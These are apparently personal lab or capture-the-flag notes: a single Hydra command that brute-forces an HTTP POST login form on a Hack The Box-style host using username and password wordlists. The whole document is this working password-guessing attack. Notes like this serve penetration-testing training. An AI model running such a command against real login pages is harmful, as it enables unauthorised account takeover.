# Hydra

## http post form password brute force attack.  

`hydra -L usernames.txt -P passwords.txt site.htb http-post-form "/path/file.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed."`
